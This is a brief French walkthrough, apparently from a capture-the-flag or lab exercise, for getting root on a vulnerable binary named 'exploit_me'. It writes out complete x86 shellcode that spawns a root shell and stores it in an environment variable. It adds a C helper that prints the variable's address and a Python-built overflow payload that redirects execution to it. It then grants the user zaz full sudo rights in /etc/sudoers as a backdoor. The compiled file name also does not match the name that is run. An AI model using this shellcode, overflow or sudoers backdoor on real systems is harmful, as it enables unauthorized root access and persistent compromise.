Etape 1 :
Ce connecter avec les identifiants zaz.
Etape 2 :

faire la commande : 
	export OPEN_TERMINAL=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

cree un program qui retourne une l'adresse de la variable d'environment
	#include <stdio.h>
	#include <stdlib.h>

	int main(int argc, char **argv)
	{
		if (argc == 2)
		{
			char* ptr = getenv(argv[1]);
			printf("%p\n", ptr);
		}
	}

le compiler et le lancer : 
	gcc env_adress.c -o env_adress
	./getEnvAddress OPEN_TERMINAL
	0xbffffe60

ensuite utiliser exploit_me avec une chaine de le payload suivant :
	./exploit_me $(python -c 'print "\x90" * 140 + "\x60\xfe\xff\xbf"')

Des qu'on a les droit root on donne tout les privilege root a l'utilisateur zaz dans le fichier /etc/sudoers